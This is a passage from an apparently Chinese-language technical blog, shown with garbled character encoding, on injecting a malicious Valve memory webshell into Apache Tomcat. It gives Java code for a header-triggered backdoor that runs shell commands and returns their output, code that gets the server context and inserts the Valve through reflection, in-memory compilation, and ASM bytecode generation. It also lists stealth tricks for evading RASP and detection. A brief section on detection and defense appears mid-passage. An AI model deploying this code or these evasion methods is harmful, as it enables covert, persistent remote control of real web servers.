class="hljs-number">0</span>, newValves, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);    <span class="hljs-comment">// ä¿ç•™ç¬¬ä¸€ä¸ªValve</span><br>newValves[<span class="hljs-number">1</span>] = (Valve) evilValve;                <span class="hljs-comment">// æ¶æ„Valveæ’å…¥ç¬¬äºŒä½</span><br>System.arraycopy(valves, <span class="hljs-number">1</span>, newValves, <span class="hljs-number">2</span>, valves.<span class="hljs-built_in">length</span> - <span class="hljs-number">1</span>);<br>valvesField.set(pipeline, newValves);<br></code></pre></td></tr></table></figure><ul><li><strong>ä½ç½®ç­–ç•¥</strong>ï¼šæ’å…¥åœ¨<code>StandardContextValve</code>ä¹‹å‰ï¼ˆé€šå¸¸ç´¢å¼•1ï¼‰ç¡®ä¿æ•è·æ‰€æœ‰è¯·æ±‚ã€‚</li></ul><h3 id="ä¸‰ã€æ¶æ„Valveç±»å®ç°æ¨¡æ¿"><a href="#ä¸‰ã€æ¶æ„Valveç±»å®ç°æ¨¡æ¿" class="headerlink" title="ä¸‰ã€æ¶æ„Valveç±»å®ç°æ¨¡æ¿"></a><strong>ä¸‰ã€æ¶æ„Valveç±»å®ç°æ¨¡æ¿</strong></h3><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilValve</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Valve</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> final <span class="hljs-title class_">String</span> password = <span class="hljs-string">&quot;X-TOKEN&quot;</span>; <span class="hljs-comment">// æ¿€æ´»å¯†ç </span><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">invoke</span>(<span class="hljs-title class_">Request</span> request, <span class="hljs-title class_">Response</span> response) throws <span class="hljs-title class_">IOException</span>, <span class="hljs-title class_">ServletException</span> &#123;<br>        <span class="hljs-comment">// 1. æ£€æŸ¥æ¿€æ´»å¯†ç </span><br>        <span class="hljs-title class_">String</span> cmd = request.<span class="hljs-title function_">getHeader</span>(password);<br>        <span class="hljs-keyword">if</span> (cmd == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-title function_">getNext</span>().<span class="hljs-title function_">invoke</span>(request, response); <span class="hljs-comment">// ä¼ é€’è¯·æ±‚</span><br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// 2. æ‰§è¡Œå‘½ä»¤å¹¶å›æ˜¾</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-title class_">String</span>[] cmds = <span class="hljs-title class_">System</span>.<span class="hljs-title function_">getProperty</span>(<span class="hljs-string">&quot;os.name&quot;</span>).<span class="hljs-title function_">contains</span>(<span class="hljs-string">&quot;win&quot;</span>) <br>                ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, cmd&#125; <br>                : <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, cmd&#125;;<br>            <span class="hljs-title class_">Process</span> p = <span class="hljs-title class_">Runtime</span>.<span class="hljs-title function_">getRuntime</span>().<span class="hljs-title function_">exec</span>(cmds);<br>            <span class="hljs-title class_">InputStream</span> <span class="hljs-keyword">in</span> = p.<span class="hljs-title function_">getInputStream</span>();<br>            <span class="hljs-comment">// ... è¯»å–è¾“å‡ºå¹¶å†™å…¥response ...</span><br>        &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">Exception</span> e) &#123;<br>            response.<span class="hljs-title function_">getWriter</span>().<span class="hljs-title function_">write</span>(<span class="hljs-string">&quot;ERROR: &quot;</span> + e.<span class="hljs-title function_">getMessage</span>());<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// å…¶ä»–Valveæ¥å£æ–¹æ³•ï¼ˆç©ºå®ç°ï¼‰</span><br>    <span class="hljs-meta">@Override</span> <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getInfo</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>; &#125;<br>    <span class="hljs-meta">@Override</span> <span class="hljs-keyword">public</span> <span class="hljs-title class_">Valve</span> <span class="hljs-title function_">getNext</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>; &#125;<br>    <span class="hljs-meta">@Override</span> <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">setNext</span>(<span class="hljs-params"><span class="hljs-title class_">Valve</span> valve</span>) &#123;&#125;<br>    <span class="hljs-meta">@Override</span> <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">backgroundProcess</span>(<span class="hljs-params"></span>) &#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="å››ã€æŠ€æœ¯éš¾ç‚¹ä¸è§„é¿æ–¹æ¡ˆ"><a href="#å››ã€æŠ€æœ¯éš¾ç‚¹ä¸è§„é¿æ–¹æ¡ˆ" class="headerlink" title="å››ã€æŠ€æœ¯éš¾ç‚¹ä¸è§„é¿æ–¹æ¡ˆ"></a><strong>å››ã€æŠ€æœ¯éš¾ç‚¹ä¸è§„é¿æ–¹æ¡ˆ</strong></h3><ol><li><p><strong>ClassLoaderç©¿é€é—®é¢˜</strong></p><ul><li><p>åœºæ™¯ï¼šåœ¨<code>BootstrapClassLoader</code>ä¸­æ‰§è¡Œï¼ˆå¦‚ååºåˆ—åŒ–æ¼æ´ï¼‰</p></li><li><p>æ–¹æ¡ˆï¼šé€šè¿‡çº¿ç¨‹ä¸Šä¸‹æ–‡ç±»åŠ è½½å™¨ä¼ é€’</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">Thread<span class="hljs-selector-class">.currentThread</span>()<span class="hljs-selector-class">.setContextClassLoader</span>(webappClassLoader);<br></code></pre></td></tr></table></figure></li></ul></li><li><p><strong>Tomcatç‰ˆæœ¬å…¼å®¹æ€§</strong></p><ul><li><p><code>StandardRoot</code>è·¯å¾„å˜åŒ–ï¼ˆTomcat 8.0+ï¼‰ï¼š</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs oxygene"><span class="hljs-comment">// Tomcat 8.5+ è·å–StandardContext</span><br>Object resources = webappClassLoader.getResources()<span class="hljs-punctuation">;</span><br><span class="hljs-keyword">Method</span> <span class="hljs-title function_">getContextMethod</span> = <span class="hljs-title function_">resources</span>.<span class="hljs-title function_">getClass</span><span class="hljs-params">()</span>.<span class="hljs-title function_">getMethod</span><span class="hljs-params">(&quot;getContext&quot;)</span>;<br>Object standardContext = getContextMethod.invoke(resources)<span class="hljs-punctuation">;</span><br></code></pre></td></tr></table></figure></li></ul></li><li><p><strong>å†…å­˜é©¬éšèº«æŠ€å·§</strong></p><ul><li>ç±»åä¼ªè£…ï¼š<code>com.sun.tools.javac.util.Context</code>ï¼ˆä»¿JDKç±»ï¼‰</li><li>å­—èŠ‚ç åŠ å¯†ï¼šè¿è¡Œæ—¶è§£å¯†åå†defineClass</li><li>æƒ°æ€§åŠ è½½ï¼šé¦–æ¬¡åŒ¹é…å¯†ç æ—¶æ‰åˆå§‹åŒ–å‘½ä»¤æ‰§è¡Œé€»è¾‘</li></ul></li></ol><h3 id="äº”ã€æ£€æµ‹ä¸é˜²å¾¡æ‰‹æ®µ"><a href="#äº”ã€æ£€æµ‹ä¸é˜²å¾¡æ‰‹æ®µ" class="headerlink" title="äº”ã€æ£€æµ‹ä¸é˜²å¾¡æ‰‹æ®µ"></a><strong>äº”ã€æ£€æµ‹ä¸é˜²å¾¡æ‰‹æ®µ</strong></h3><h4 id="æ£€æµ‹æ–¹æ¡ˆ"><a href="#æ£€æµ‹æ–¹æ¡ˆ" class="headerlink" title="æ£€æµ‹æ–¹æ¡ˆ"></a><strong>æ£€æµ‹æ–¹æ¡ˆ</strong></h4><ol><li><p><strong>Heap Dumpåˆ†æ</strong></p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> java.lang.<span class="hljs-keyword">Object</span> <br><span class="hljs-keyword">WHERE</span> <span class="hljs-built_in">toString</span>() <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&quot;%StandardContextValve%&quot;</span> <br><span class="hljs-keyword">AND</span> dominators() INCLUDES $.valves<br></code></pre></td></tr></table></figure><ul><li>å®šä½<code>StandardPipeline.valves</code>æ•°ç»„ä¸­å¼‚å¸¸Valve</li></ul></li><li><p><strong>RASPç›‘æ§ç‚¹</strong></p><ul><li>æ‹¦æˆª<code>ClassLoader.defineClass()</code>è°ƒç”¨</li><li>ç›‘æ§<code>StandardPipeline.addValve()</code>åå°„è°ƒç”¨æ ˆ</li><li>æ£€æµ‹éåˆå§‹åŒ–é˜¶æ®µæ–°å¢çš„Valve</li></ul></li><li><p><strong>è¡Œä¸ºç‰¹å¾æ£€æµ‹</strong></p><ul><li>è¯·æ±‚å¤´åŒ…å«<code>X-TOKEN</code>ç­‰å›ºå®šæ ‡è®°</li><li>æ— å…³è”é¡µé¢çš„HTTPè¯·æ±‚è¿”å›å‘½ä»¤è¾“å‡º</li></ul></li></ol><h4 id="é˜²å¾¡æªæ–½"><a href="#é˜²å¾¡æªæ–½" class="headerlink" title="é˜²å¾¡æªæ–½"></a><strong>é˜²å¾¡æªæ–½</strong></h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- ç¦ç”¨Contextçš„ç®¡é“ä¿®æ”¹ (context.xml) --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">Context</span> <span class="hljs-attr">allowPipelineModification</span>=<span class="hljs-string">&quot;false&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><ol><li><p><strong>ç­–ç•¥é™åˆ¶</strong></p><ul><li>ç¦æ­¢åå°„è°ƒç”¨<code>defineClass()</code>ï¼ˆSecurityManagerï¼‰</li><li>é”å®š<code>StandardPipeline.valves</code>æ•°ç»„å†™æƒé™</li></ul></li><li><p><strong>è¿è¡Œæ—¶åŠ å›º</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">-javaagent:rasp_agent.<span class="hljs-attribute">jar</span>=block_unauth_valve<br></code></pre></td></tr></table></figure></li></ol><h2 id="æ··åˆæ–¹å¼ï¼ˆåˆ©ç”¨-Tomcat-API-åå°„ï¼‰"><a href="#æ··åˆæ–¹å¼ï¼ˆåˆ©ç”¨-Tomcat-API-åå°„ï¼‰" class="headerlink" title="æ··åˆæ–¹å¼ï¼ˆåˆ©ç”¨ Tomcat API &amp; åå°„ï¼‰"></a>æ··åˆæ–¹å¼ï¼ˆåˆ©ç”¨ Tomcat API &amp; åå°„ï¼‰</h2><h3 id="ä¸€ã€æ··åˆæ³¨å…¥çš„æ ¸å¿ƒä¼˜åŠ¿"><a href="#ä¸€ã€æ··åˆæ³¨å…¥çš„æ ¸å¿ƒä¼˜åŠ¿" class="headerlink" title="ä¸€ã€æ··åˆæ³¨å…¥çš„æ ¸å¿ƒä¼˜åŠ¿"></a>ä¸€ã€æ··åˆæ³¨å…¥çš„æ ¸å¿ƒä¼˜åŠ¿</h3><ol><li><strong>æ•ˆç‡ä¸ç¨³å®šæ€§çš„å¹³è¡¡</strong>ï¼š<ul><li>ä½¿ç”¨Tomcat APIç›´æ¥è°ƒç”¨æ ¸å¿ƒæ–¹æ³•ï¼Œå‡å°‘åå°„æ“ä½œ</li><li>å¯¹å…³é”®è·¯å¾„ä½¿ç”¨åå°„çªç ´è®¿é—®é™åˆ¶</li><li>æ¯”çº¯åå°„æ–¹å¼æ›´ç¨³å®šï¼Œå‡å°‘ç‰ˆæœ¬å…¼å®¹é—®é¢˜</li></ul></li><li><strong>é™ä½æ£€æµ‹é£é™©</strong>ï¼š<ul><li>å‡å°‘åå°„è°ƒç”¨æ¬¡æ•°ï¼Œé¿å…è§¦å‘RASPçš„åå°„ç›‘æ§</li><li>ç›´æ¥APIè°ƒç”¨æ··å…¥æ­£å¸¸ä¸šåŠ¡é€»è¾‘ä¸­æ›´éšè”½</li></ul></li><li><strong>å¼€å‘ä¾¿åˆ©æ€§</strong>ï¼š<ul><li>ä»£ç å¯è¯»æ€§æ›´é«˜</li><li>è°ƒè¯•å’Œç»´æŠ¤æ›´ç®€å•</li></ul></li></ol><h3 id="äºŒã€æ··åˆæ³¨å…¥è¯¦ç»†æµç¨‹"><a href="#äºŒã€æ··åˆæ³¨å…¥è¯¦ç»†æµç¨‹" class="headerlink" title="äºŒã€æ··åˆæ³¨å…¥è¯¦ç»†æµç¨‹"></a>äºŒã€æ··åˆæ³¨å…¥è¯¦ç»†æµç¨‹</h3><h3 id="å‰ç½®æ¡ä»¶"><a href="#å‰ç½®æ¡ä»¶" class="headerlink" title="å‰ç½®æ¡ä»¶"></a>å‰ç½®æ¡ä»¶</h3><ul><li>å·²è·å¾—æ‰§è¡Œç¯å¢ƒï¼ˆå¦‚é€šè¿‡JSP WebShellæˆ–ååºåˆ—åŒ–æ¼æ´ï¼‰</li><li>Tomcat APIåº“ï¼ˆcatalina.jarï¼‰åœ¨ç±»è·¯å¾„ä¸­å¯ç”¨</li><li>å½“å‰ClassLoaderæ˜¯WebappClassLoader</li></ul><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">// è·å–å½“å‰Webåº”ç”¨çš„ClassLoader<br>WebappClassLoader classLoader <span class="hljs-operator">=</span> <br>    (WebappClassLoader) Thread.currentThread().getContextClassLoader()<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p><strong>æ­¥éª¤1ï¼šè·å–StandardContextå¯¹è±¡ï¼ˆæ··åˆæ–¹å¼ï¼‰</strong></p><h4 id="æ–¹æ³•Aï¼šé€šè¿‡ServletContextï¼ˆæ¨èï¼‰"><a href="#æ–¹æ³•Aï¼šé€šè¿‡ServletContextï¼ˆæ¨èï¼‰" class="headerlink" title="æ–¹æ³•Aï¼šé€šè¿‡ServletContextï¼ˆæ¨èï¼‰"></a>æ–¹æ³•Aï¼šé€šè¿‡ServletContextï¼ˆæ¨èï¼‰</h4><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs abnf">// åœ¨JSP/Servletç¯å¢ƒä¸­å¯ç›´æ¥è·å–request<br>ServletRequest request <span class="hljs-operator">=</span> ...<span class="hljs-comment">; </span><br><br>// è·å–ServletContext<br>ServletContext servletContext <span class="hljs-operator">=</span> request.getServletContext()<span class="hljs-comment">;</span><br><br>// åå°„è·å–ApplicationContext<br>Field appCtxField <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>)<span class="hljs-comment">;</span><br>appCtxField.setAccessible(true)<span class="hljs-comment">;</span><br>ApplicationContext appCtx <span class="hljs-operator">=</span> (ApplicationContext) appCtxField.get(servletContext)<span class="hljs-comment">;</span><br><br>// åå°„è·å–StandardContext<br>Field stdCtxField <span class="hljs-operator">=</span> appCtx.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>)<span class="hljs-comment">;</span><br>stdCtxField.setAccessible(true)<span class="hljs-comment">;</span><br>StandardContext standardContext <span class="hljs-operator">=</span> (StandardContext) stdCtxField.get(appCtx)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h4 id="æ–¹æ³•Bï¼šé€šè¿‡ClassLoaderï¼ˆæ— requestæ—¶ï¼‰"><a href="#æ–¹æ³•Bï¼šé€šè¿‡ClassLoaderï¼ˆæ— requestæ—¶ï¼‰" class="headerlink" title="æ–¹æ³•Bï¼šé€šè¿‡ClassLoaderï¼ˆæ— requestæ—¶ï¼‰"></a>æ–¹æ³•Bï¼šé€šè¿‡ClassLoaderï¼ˆæ— requestæ—¶ï¼‰</h4><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs abnf">// åå°„è·å–WebappClassLoaderçš„resourceså­—æ®µ<br>Field resourcesField <span class="hljs-operator">=</span> WebappClassLoader.class.getDeclaredField(<span class="hljs-string">&quot;resources&quot;</span>)<span class="hljs-comment">;</span><br>resourcesField.setAccessible(true)<span class="hljs-comment">;</span><br>StandardRoot standardRoot <span class="hljs-operator">=</span> (StandardRoot) resourcesField.get(classLoader)<span class="hljs-comment">;</span><br><br>// ç›´æ¥APIè°ƒç”¨è·å–Context<br>Context context <span class="hljs-operator">=</span> standardRoot.getContext()<span class="hljs-comment">; // Tomcat 8.5+</span><br>StandardContext standardContext <span class="hljs-operator">=</span> (StandardContext) context<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p><strong>æ­¥éª¤2ï¼šè·å–Pipelineå¯¹è±¡ï¼ˆç›´æ¥APIï¼‰</strong></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">// ç›´æ¥è°ƒç”¨StandardContextçš„APIæ–¹æ³•<br>Pipeline pipeline <span class="hljs-operator">=</span> standardContext.getPipeline()<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p><strong>æ­¥éª¤3ï¼šåˆ›å»ºæ¶æ„Valveå®ä¾‹</strong></p><h4 id="æ–¹æ³•Aï¼šåŠ¨æ€ç±»å®šä¹‰ï¼ˆæ— æ–‡ä»¶è½åœ°ï¼‰"><a href="#æ–¹æ³•Aï¼šåŠ¨æ€ç±»å®šä¹‰ï¼ˆæ— æ–‡ä»¶è½åœ°ï¼‰" class="headerlink" title="æ–¹æ³•Aï¼šåŠ¨æ€ç±»å®šä¹‰ï¼ˆæ— æ–‡ä»¶è½åœ°ï¼‰"></a>æ–¹æ³•Aï¼šåŠ¨æ€ç±»å®šä¹‰ï¼ˆæ— æ–‡ä»¶è½åœ°ï¼‰</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// å®šä¹‰æ¶æ„Valveç±»ï¼ˆç®€åŒ–ç‰ˆï¼‰</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StealthValve</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ValveBase</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">TRIGGER_HEADER</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;X-Health-Check&quot;</span>;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Request request, Response response)</span> &#123;<br>        <span class="hljs-keyword">if</span> (request.getHeader(TRIGGER_HEADER) != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-comment">// å‘½ä»¤æ‰§è¡Œé€»è¾‘...</span><br>        &#125;<br>        getNext().invoke(request, response);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// åœ¨å†…å­˜ä¸­ç¼–è¯‘ç±»ï¼ˆä½¿ç”¨Java Compiler APIï¼‰</span><br><span class="hljs-type">JavaCompiler</span> <span class="hljs-variable">compiler</span> <span class="hljs-operator">=</span> ToolProvider.getSystemJavaCompiler();<br><span class="hljs-type">StandardJavaFileManager</span> <span class="hljs-variable">fileManager</span> <span class="hljs-operator">=</span> <br>    compiler.getStandardFileManager(<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br><br><span class="hljs-comment">// åŠ¨æ€ç”Ÿæˆæºç </span><br><span class="hljs-type">String</span> <span class="hljs-variable">sourceCode</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;...&quot;</span>; <span class="hljs-comment">// å®Œæ•´çš„StealthValveæºç </span><br><span class="hljs-type">JavaFileObject</span> <span class="hljs-variable">source</span> <span class="hljs-operator">=</span> <br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleJavaFileObject</span>(URI.create(<span class="hljs-string">&quot;string:///StealthValve.java&quot;</span>), <br>        JavaFileObject.Kind.SOURCE) &#123;<br>        <span class="hljs-keyword">public</span> CharSequence <span class="hljs-title function_">getCharContent</span><span class="hljs-params">(<span class="hljs-type">boolean</span> ignoreEncodingErrors)</span> &#123;<br>            <span class="hljs-keyword">return</span> sourceCode;<br>        &#125;<br>    &#125;;<br><br><span class="hljs-comment">// ç¼–è¯‘åˆ°å†…å­˜</span><br><span class="hljs-type">CompilationTask</span> <span class="hljs-variable">task</span> <span class="hljs-operator">=</span> compiler.getTask(<span class="hljs-literal">null</span>, fileManager, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, Arrays.asList(source));<br>task.call();<br><br><span class="hljs-comment">// åŠ è½½ç¼–è¯‘åçš„ç±»</span><br>Class&lt;?&gt; valveClass = classLoader.loadClass(<span class="hljs-string">&quot;com.example.StealthValve&quot;</span>);<br><span class="hljs-type">Valve</span> <span class="hljs-variable">evilValve</span> <span class="hljs-operator">=</span> (Valve) valveClass.newInstance();<br></code></pre></td></tr></table></figure><h4 id="æ–¹æ³•Bï¼šå­—èŠ‚ç æ³¨å…¥ï¼ˆASMå¢å¼ºï¼‰"><a href="#æ–¹æ³•Bï¼šå­—èŠ‚ç æ³¨å…¥ï¼ˆASMå¢å¼ºï¼‰" class="headerlink" title="æ–¹æ³•Bï¼šå­—èŠ‚ç æ³¨å…¥ï¼ˆASMå¢å¼ºï¼‰"></a>æ–¹æ³•Bï¼šå­—èŠ‚ç æ³¨å…¥ï¼ˆASMå¢å¼ºï¼‰</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// ä½¿ç”¨ASMåŠ¨æ€ç”ŸæˆValveå­—èŠ‚ç </span><br><span class="hljs-type">ClassWriter</span> <span class="hljs-variable">cw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassWriter</span>(ClassWriter.COMPUTE_FRAMES);<br>cw.visit(Opcodes.V1_8, Opcodes.ACC_PUBLIC, <br>    <span class="hljs-string">&quot;com/evil/HealthCheckValve&quot;</span>, <span class="hljs-literal">null</span>, <br>    <span class="hljs-string">&quot;org/apache/catalina/valves/ValveBase&quot;</span>, <span class="hljs-literal">null</span>);<br><br><span class="hljs-comment">// ç”Ÿæˆinvokeæ–¹æ³•...</span><br><span class="hljs-type">MethodVisitor</span> <span class="hljs-variable">mv</span> <span class="hljs-operator">=</span> cw.visitMethod(Opcodes.ACC_PUBLIC, <span class="hljs-string">&quot;invoke&quot;</span>, <br>    <span class="hljs-string">&quot;(Lorg/apache/catalina/connector/Request;Lorg/apache/catalina/connector/Response;)V&quot;</span>, <br>    <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>    <br><span class="hljs-comment">// æ–¹æ³•é€»è¾‘ï¼šæ£€æŸ¥Header-&gt;æ‰§è¡Œå‘½ä»¤-&gt;å›ä¼ ç»“æœ</span><br>mv.visitCode();<br><span class="hljs-comment">// ... å­—èŠ‚ç æŒ‡ä»¤ ...</span><br>mv.visitEnd();<br><br><span class="hljs-comment">// å®šä¹‰ç±»</span><br><span class="hljs-type">byte</span>[] bytecode = cw.toByteArray();<br>Class&lt;?&gt; valveClass = classLoader.defineClass(<br>    <span class="hljs-string">&quot;com.evil.HealthCheckValve&quot;</span>, bytecode, <span class="hljs-number">0</span>, bytecode.length);<br><span class="hljs-type">Valve</span> <span class="hljs-variable">evilValve</span> <span class="hljs-operator">=</span> (Valve) valveClass.newInstance();<br></code></pre></td></tr></table></figure><p><strong>æ­¥éª¤4ï¼šæ³¨å…¥Valveåˆ°ç®¡é“ï¼ˆAPI+åå°„ï¼‰</strong></p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-comment">// ç›´æ¥APIæ–¹å¼æ·»åŠ Valve</span><br>pipeline.addValve(evilValve);<br><br><span class="hljs-comment">// è°ƒæ•´ä½ç½®åˆ°å…³é”®èŠ‚ç‚¹ï¼ˆåå°„æ“ä½œï¼‰</span><br>Field valvesField = pipeline.getClass().getDeclaredField(<span class="hljs-string">&quot;valves&quot;</span>);<br>valvesField.setAccessible(<span class="hljs-literal">true</span>);<br>Valve[] valves = (Valve[]) valvesField.<span class="hljs-keyword">get</span>(pipeline);<br><br><span class="hljs-comment">// æŸ¥æ‰¾StandardContextValveçš„ä½ç½®</span><br><span class="hljs-built_in">int</span> targetIndex = <span class="hljs-number">-1</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; valves.length; i++) &#123;<br>    <span class="hljs-keyword">if</span> (valves[i] instanceof StandardContextValve) &#123;<br>        targetIndex = i;<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// åœ¨StandardContextValveå‰æ’å…¥</span><br><span class="hljs-keyword">if</span> (targetIndex != <span class="hljs-number">-1</span>) &#123;<br>    Valve[] newValves = <span class="hljs-keyword">new</span> Valve[valves.length + <span class="hljs-number">1</span>];<br>    System.arraycopy(valves, <span class="hljs-number">0</span>, newValves, <span class="hljs-number">0</span>, targetIndex);<br>    newValves[targetIndex] = evilValve;<br>    System.arraycopy(valves, targetIndex, newValves, <br>        targetIndex + <span class="hljs-number">1</span>, valves.length - targetIndex);<br>    valvesField.<span class="hljs-keyword">set</span>(pipeline, newValves);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ä¸‰ã€é«˜çº§éšè”½æŠ€æœ¯"><a href="#ä¸‰ã€é«˜çº§éšè”½æŠ€æœ¯" class="headerlink" 